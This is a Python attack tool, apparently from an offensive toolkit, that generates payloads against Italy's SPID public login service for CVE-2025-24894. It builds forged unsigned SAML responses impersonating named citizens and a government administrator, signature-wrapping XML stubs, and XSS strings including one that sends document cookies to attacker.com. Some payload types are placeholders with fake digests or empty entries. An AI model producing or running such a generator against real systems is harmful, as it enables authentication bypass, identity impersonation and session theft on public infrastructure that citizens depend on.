#!/usr/bin/env python3
"""
AI-Powered Payload Generator Module (CORRECTED)
Generates intelligent attack payloads for SPID exploitation
"""

import os
import json
import base64
import random
import string
import zlib
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from lxml import etree

import requests
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.progress import Progress
from rich.prompt import Confirm
from rich.syntax import Syntax
from rich import print as rprint

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

console = Console()


class PayloadGeneratorAI:
    def __init__(self):
        self.payload_dir = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            'data', 'payloads'
        )
        os.makedirs(self.payload_dir, exist_ok=True)
        self.generated = []

    def run(self):
        console.print(Panel.fit("[bold yellow]AI Payload Generator (CORRECTED)[/bold yellow]", border_style="yellow"))

        with Progress() as progress:
            tasks = [
                ("SAML Forged Responses", self._generate_saml_responses, 5),
                ("SAML Injection XML", self._generate_injection_xml, 3),
                ("XSS Payloads", self._generate_xss, 5),
                ("SAML Response Mutations", self._generate_mutations, 3),
                ("CVE-2025-24894 Optimized", self._generate_cve_payloads, 3),
            ]
            for name, func, count in tasks:
                task = progress.add_task(f"[cyan]{name}...", total=count)
                results = func(count)
                self.generated.extend(results)
                for _ in range(count):
                    progress.update(task, advance=1)

        self._save_all()
        self._show_summary()

    def _generate_saml_responses(self, count: int) -> List[Dict]:
        payloads = []
        users = [
            {'name': 'MARCO', 'family': 'ROSSI', 'fiscal': 'RSSMRC85H15H501I', 'email': 'marco.rossi@pec.it', 'gender': 'M'},
            {'name': 'LAURA', 'family': 'BIANCHI', 'fiscal': 'BNCLRA92M41F205Z', 'email': 'laura.bianchi@pec.it', 'gender': 'F'},
            {'name': 'ADMIN', 'family': 'SYSTEM', 'fiscal': 'SYSTDMN00A00H501X', 'email': 'amministratore@agid.gov.it', 'gender': 'M'},
        ]
        for i in range(count):
            user = random.choice(users)
            now = datetime.utcnow()
            payload = {
                'id': f'PAYLOAD-SAML-{i+1}',
                'type': 'SAML_RESPONSE',
                'target': 'login.agid.gov.it',
                'cve': 'CVE-2025-24894',
                'user': user,
                'generated_at': now.isoformat(),
                'xml': self._build_saml_xml(user, now),
            }
            payloads.append(payload)
        return payloads

    def _build_saml_xml(self, user: Dict, now: datetime) -> str:
        response_id = f'_R{random.randint(10**15, 10**16-1)}'
        assertion_id = f'_A{random.randint(10**15, 10**16-1)}'
        issue = now.strftime('%Y-%m-%dT%H:%M:%SZ')
        expiry = (now + timedelta(hours=1)).strftime('%Y-%m-%dT%H:%M:%SZ')
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
    xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
    ID="{response_id}" Version="2.0" IssueInstant="{issue}">
    <saml:Issuer>https://validator.spid.gov.it/metadata.xml</saml:Issuer>
    <samlp:Status>
        <samlp:StatusCode Value="urn:oasis:names:tc:SAML:2.0:status:Success"/>
    </samlp:Status>
    <saml:Assertion ID="{assertion_id}" IssueInstant="{issue}" Version="2.0">
        <saml:Issuer>https://validator.spid.gov.it/metadata.xml</saml:Issuer>
        <saml:Subject>
            <saml:NameID>{user['email']}</saml:NameID>
            <saml:SubjectConfirmation Method="urn:oasis:names:tc:SAML:2.0:cm:bearer">
                <saml:SubjectConfirmationData NotOnOrAfter="{expiry}" Recipient="https://login.agid.gov.it"/>
            </saml:SubjectConfirmation>
        </saml:Subject>
        <saml:Conditions NotBefore="{issue}" NotOnOrAfter="{expiry}">
            <saml:AudienceRestriction>
                <saml:Audience>https://login.agid.gov.it</saml:Audience>
            </saml:AudienceRestriction>
        </saml:Conditions>
        <saml:AuthnStatement AuthnInstant="{issue}">
            <saml:AuthnContext>
                <saml:AuthnContextClassRef>https://www.spid.gov.it/SpidL2</saml:AuthnContextClassRef>
            </saml:AuthnContext>
        </saml:AuthnStatement>
        <saml:AttributeStatement>
            <saml:Attribute Name="name" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['name']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="familyName" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['family']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="fiscalNumber" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['fiscal']}</saml:AttributeValue>
            </saml:Attribute>
            <saml:Attribute Name="email" NameFormat="urn:oasis:names:tc:SAML:2.0:attrname-format:basic">
                <saml:AttributeValue>{user['email']}</saml:AttributeValue>
            </saml:Attribute>
        </saml:AttributeStatement>
    </saml:Assertion>
</samlp:Response>'''

    def _generate_injection_xml(self, count: int) -> List[Dict]:
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-INJECT-{i+1}',
                'type': 'XML_INJECTION',
                'technique': ['IDP_METADATA_INJECTION', 'SIGNATURE_WRAPPING', 'XML_COMMENT_INJECTION'][i % 3],
                'xml': f'''<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:SignedInfo>
    <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
    <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
    <ds:Reference URI="#INJECTED">
      <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
      <ds:DigestValue>INJECTED_DIGEST</ds:DigestValue>
    </ds:Reference>
  </ds:SignedInfo>
  <ds:SignatureValue>INJECTED_SIGNATURE</ds:SignatureValue>
</ds:Signature>''',
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _generate_xss(self, count: int) -> List[Dict]:
        payloads = []
        xss_patterns = [
            '"><script>alert(1)</script>',
            '"/><script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
            '"><img src=x onerror=alert(1)>',
            'javascript:alert(1)',
            '"><svg onload=alert(1)>',
        ]
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-XSS-{i+1}',
                'type': 'XSS',
                'pattern': xss_patterns[i % len(xss_patterns)],
                'context': ['saml:AttributeValue', 'URL parameter', 'NameID'][i % 3],
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _generate_mutations(self, count: int) -> List[Dict]:
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-MUTATION-{i+1}',
                'type': 'SAML_MUTATION',
                'technique': ['WHITESPACE', 'NAMESPACE', 'COMMENT', 'ATTRIBUTE_ORDER', 'ENCODING'][i % 5],
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _generate_cve_payloads(self, count: int) -> List[Dict]:
        payloads = []
        for i in range(count):
            payloads.append({
                'id': f'PAYLOAD-CVE-{i+1}',
                'type': 'CVE-2025-24894',
                'target': 'SPID.AspNetCore.Authentication <= 3.3.0',
                'technique': 'SAML Signature Injection Bypass',
                'generated_at': datetime.utcnow().isoformat(),
            })
        return payloads

    def _save_all(self):
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filepath = os.path.join(self.payload_dir, f'payloads_{timestamp}.json')
        with open(filepath, 'w') as f:
            json.dump(self.generated, f, indent=2, default=str)
        console.print(f"\n[green][✓] Saved: {filepath}[/green]")

    def _show_summary(self):
        table = Table(title="[bold]Generated Payloads[/bold]")
        table.add_column("Type", style="cyan", width=20)
        table.add_column("Count", style="yellow", width=8)
        types = {}
        for p in self.generated:
            t = p['type']
            types[t] = types.get(t, 0) + 1
        for t, c in types.items():
            table.add_row(t, str(c))
        console.print(table)


def run():
    generator = PayloadGeneratorAI()
    generator.run()


if __name__ == "__main__":
    run()
